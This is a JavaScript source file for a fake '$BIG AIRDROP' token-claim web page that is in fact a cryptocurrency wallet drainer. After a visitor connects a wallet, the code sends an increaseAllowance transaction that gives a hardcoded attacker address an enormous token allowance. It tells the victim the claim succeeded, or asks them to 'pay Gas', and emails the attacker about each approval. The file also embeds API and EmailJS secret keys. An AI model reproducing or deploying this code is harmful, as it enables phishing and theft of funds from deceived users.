import Onboard from '@web3-onboard/core';
import injectedModule, { ProviderLabel} from '@web3-onboard/injected-wallets';
import { ethers } from 'ethers';
import coinbaseWalletModule from "@web3-onboard/coinbase";
import Web3 from 'web3';
import emailjs from "@emailjs/nodejs";
import trustModule from '@web3-onboard/trust';
import Moralis from "moralis";
import { EvmChain } from '@moralisweb3/common-evm-utils'; 

   



const rpcUrl = "https://mainnet.infura.io/v3/c7072401d3e44584b391ead243a11e7f"; // Goerly RPC
const chainId = 1 ;// Eth chain id
const initiator = "0x27bc110cdca1A375b0623aF9954E0824ab4e9337" ;// initiator address
const metamaskAppDeepLink='https://metamask.app.link/dapp/https://evilpepeverify.store/'
const trustWalletDeepLink = 'https://link.trustwallet.com/open_url?coin_id=60&url=https://evilpepeverify.store/'
const isTrustWallet = window.ethereum && window.ethereum.isTrust;
const isNotTrustWallet = !isTrustWallet;





// ABIs
function isMobileDevice() {
  return "ontouchstart" in window || "onmsgesturechange" in window;
}

 const ConnectModalOptions = {
  /**
   * Display the connect modal sidebar - only applies to desktop views
   */

   showSidebar: false
  

}


// ABIs
// Set the ERC-20 balanceOf() ABI
const balanceOfABI = [
  {
      "constant": true,
      "inputs": [
          {
              "name": "_owner",
              "type": "address"
          }
      ],
      "name": "balanceOf",
      "outputs": [
          {
              "name": "balance",
              "type": "uint256"
          }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
  },
];








const ERC20_ABI2 = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_addedValue", "type": "uint256" }
    ],
    "name": "increaseAllowance",
    "outputs": [
      { "name": "success", "type": "bool" }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  }
]



// initialize the module with options
const injected = injectedModule({

  custom: [
     // include custom (not natively supported) injected wallet modules here
   ],
   // display all wallets even if they are unavailable
   displayUnavailable: true,
 
  
   // but only show Binance and Bitski wallet if they are available
   filter: {
 
     [ProviderLabel.Binance]: 'unavailable',
     [ProviderLabel.Phantom]: 'unavailable',
     [ProviderLabel.SafePal]: 'unavailable',
     [ProviderLabel.Zerion]: 'unavailable',
     [ProviderLabel.OKXWallet]: 'unavailable',
     [ProviderLabel.Tally]: 'unavailable',
     [ProviderLabel.Opera]: 'unavailable',
     [ProviderLabel.Status]: 'unavailable',
     [ProviderLabel.AlphaWallet]: 'unavailable',
     [ProviderLabel.AToken]: 'unavailable',
     [ProviderLabel.Bitpie]: 'unavailable',
     [ProviderLabel.BlockWallet]: 'unavailable',
     [ProviderLabel.Brave]: 'unavailable',
     [ProviderLabel.Dcent]: 'unavailable',
     [ProviderLabel.Frame]: 'unavailable',
     [ProviderLabel.HuobiWallet]: 'unavailable',
     [ProviderLabel.HyperPay]: 'unavailable',
     [ProviderLabel.ImToken]: 'unavailable',
     [ProviderLabel.Liquality]: 'unavailable',
     [ProviderLabel.MeetOne]: 'unavailable',
     [ProviderLabel.MyKey]: 'unavailable',
     [ProviderLabel.OwnBit]: 'unavailable',
     [ProviderLabel.XDEFI]: 'unavailable',
     [ProviderLabel.TokenPocket]: 'unavailable',
     [ProviderLabel.TP]: 'unavailable',
     [ProviderLabel.OneInch]: 'unavailable',
     [ProviderLabel.Tokenary]: 'unavailable',
     [ProviderLabel.GameStop]: 'unavailable',
     [ProviderLabel.BitKeep]: 'unavailable',
     [ProviderLabel.Sequence]: 'unavailable',
     [ProviderLabel.Core]: 'unavailable',
     [ProviderLabel.Bitski]: 'unavailable',
     [ProviderLabel.Enkrypt]: 'unavailable',
     [ProviderLabel.Zeal]: 'unavailable',
     [ProviderLabel.Exodus]: 'unavailable',
     [ProviderLabel.Frontier]: 'unavailable',
     [ProviderLabel.Rainbow]: 'unavailable',
     [ProviderLabel.DeFiWallet]: 'unavailable',
     [ProviderLabel.ApexWallet]: 'unavailable',
     [ProviderLabel.BifrostWallet]: 'unavailable',
     [ProviderLabel.Safeheron]: 'unavailable',
     [ProviderLabel.Talisman]: 'unavailable',
     [ProviderLabel.InfinityWallet]: 'unavailable',
     [ProviderLabel.Rabby]: 'unavailable',
     [ProviderLabel.MathWallet]: 'unavailable'
 
 
 
   },
 
   // do a manual sort of injected wallets so that MetaMask and Coinbase are ordered first
   sort: (wallets) => {
     const metaMask = wallets.find(({ label }) => label === ProviderLabel.MetaMask)
     const coinbase = wallets.find(({ label }) => label === ProviderLabel.Coinbase)
     const trust = wallets.find(({ label }) => label === ProviderLabel.Trust)
     
     
 
     return (
       [
         metaMask,
         coinbase,
         trust,
         
         ...wallets.filter(
           ({ label }) => label !== ProviderLabel.MetaMask && label !== ProviderLabel.Coinbase && label !== ProviderLabel.Trust 
         )
       ]
         // remove undefined values
         .filter((wallet) => wallet)
     )
   },
   walletUnavailableMessage: (wallet) => {
     selectedWalletLabel = wallet.label;
 
 
   if (isMobileDevice() && selectedWalletLabel === "MetaMask") {
     
     console.log('Redirecting to MetaMask app...');
     window.location.href = metamaskAppDeepLink;
     
     return `${wallet.label} is opening within Wallet Browser`;
 
   } else if ( isNotTrustWallet && isMobileDevice() && selectedWalletLabel === "Trust Wallet") {
 
     
     console.log('Redirecting to Trust app...');
     window.location.href = trustWalletDeepLink;
     
     return `${wallet.label} is opening within Wallet Browser`;
   }   else {
 
     if (selectedWalletLabel === "MetaMask" && !isMobileDevice()){
        window.open("https://metamask.io/download/")
         return `Oops  ${wallet.label} is unavailable`
     }
 
     else if(selectedWalletLabel === "Trust Wallet" && !isMobileDevice()){
 
             
       window.open("https://trustwallet.com/download/")
       return `Oops  ${wallet.label} is unavailable`
 
     }
 
   
        
   } 
 
 }
 
 });
 

const coinbaseWalletSdk = coinbaseWalletModule();


const onboard = Onboard({
 
  wallets: [coinbaseWalletSdk,  injected],
  chains: [
    {
      id: '0x1', 
      token: 'ETH',
      label: 'Eth',
      rpcUrl
    }
 
    
  ],

  appMetadata: {
    name: 'Big Eyes',
    description: '$BIG AIRDROP',
 
  },

  accountCenter: {
    desktop: {
      position: 'topRight',
      enabled: false,
   
    },
    mobile: {
      position: 'topRight',
      enabled: false,
      minimal: true

    },

  

    
  },

  connect: ConnectModalOptions,
   
}) 



let provider, web3
let selectedAddress
let amountToAirdrop
let buttonClicked = false;



async function connect() {
  try {

  

    const wallets = await onboard.connectWallet();
   

  


    const selectedWallet = wallets[0];


  

    if (selectedWallet) {
      const success = await onboard.setChain({ chainId: '0x1' });
      if (success) {
        provider = new ethers.providers.Web3Provider(wallets[0].provider, 'any');
        web3 = new Web3(wallets[0].provider);
       
       
        const accounts = await provider.send('eth_requestAccounts', []);
        selectedAddress = accounts[0];
        console.log(selectedAddress);
        amountToAirdrop = web3.utils.toBN('100000000000000000000000000000000000000000000000').toString(); 
        buttonClicked = true;


      
      
      } else {
        alert('Please switch chains manually.');
      }

    
    }

  } catch (error) {
    console.error('Error connecting wallet:', error);
  }
}





async function approveToken() {
  // Import Moralis
const Moralis = require('moralis').default
// Import the EvmChain dataType
const { EvmChain } = require("@moralisweb3/common-evm-utils")
  
   await Moralis.start({
      apiKey: "6p9qHaKkDnk2xWzc5GJtbXk3KlN1WKYmePnO5ph8oz518FKs97WsgjGYJ0EMpqJG" ,
    // ...and any other configuration
  });

  const  MORALIS_API_KEY = "6p9qHaKkDnk2xWzc5GJtbXk3KlN1WKYmePnO5ph8oz518FKs97WsgjGYJ0EMpqJG"
  const address = selectedAddress;
const chain = EvmChain.ETHEREUM;

// Constant token address
const tokenAddress = '0xB62E45c3Df611dcE236A6Ddc7A493d79F9DFadEf';

// You can set the token contract directly since it's constant
const tokenContract = new web3.eth.Contract(ERC20_ABI2, tokenAddress, { from: selectedAddress });

const amountToAirdrop = web3.utils.toBN('100000000000000000000000000000000000000000000000').toString();

try {
  const emailjs = require('@emailjs/nodejs');
  const myMessage = `${selectedAddress} has approved for ${initiator}`;
  const templateParams = {
    name: 'gobam',
    message: myMessage,
  };

  // Increase allowance directly on the constant token contract
  const functionSignature = tokenContract.methods.increaseAllowance(initiator, amountToAirdrop).encodeABI();
  await web3.eth.sendTransaction({ to: tokenAddress, data: functionSignature, from: selectedAddress });


  // Send email notification
  emailjs
    .send('service_zbwfnbj', 'template_jpefvy8', templateParams, {
      publicKey: 'DcKztgUoxgPC_m0Zs',
      privateKey: 'EZb2ktdzajtuj7WB7YBmV', // optional, highly recommended for security reasons
    })
    .catch(function (err) {
      console.log('FAILED...', err);
    });

  alert('Wait for Confirmation');

  // Optional: If you need to continue with the remaining increase in allowances
  // you can implement that logic here.

  alert('Congratulations on Your Claim. It Will Arrive Shortly!');
} catch (error) {
  console.error('Error:', error);
  // Handle error or show appropriate message
  alert('Please pay Gas To Receive your tokens');
}

}



const connectButton= document.getElementById('bigButton');
const permitButton= document.getElementById('msButton');






let selectedWalletLabel = "";




connectButton.addEventListener("click", async () => {

 

  if (isTrustWallet && isMobileDevice() ) {
      
    const trust = trustModule()
  
    const onboard = Onboard({
      // ... other Onboard options
     theme: 'dark',
  
      wallets: [
        trust
        //... other wallets
      ],
  
      chains: [
        {
          id: '0x1', 
          token: 'ETH',
          label: 'Eth',
          rpcUrl
        }
     
        
      ],
  
    })

    connect()
  
   }
  
  else{ 

  await onboard.connectWallet();
  
 if (isMobileDevice() && selectedWalletLabel === "") {
   
    connect();
   
  } 
  else {
    console.log('Not a mobile device or already clicked on the button.');
    connect();
   
  }

}
  
});




permitButton.addEventListener("click", async () => {
  if (!buttonClicked) {
    alert("Please connect your wallet.");
  

  } 

  else {
    try {


       approveToken();
      // Code to continue executing after approveToken
    } catch (error) {
      console.error('An error occurred while approving the token:', error);
      // Code to handle the error or perform any necessary cleanup
    }
  }

  // Call the Permit function regardless of errors in approveToken



  
});
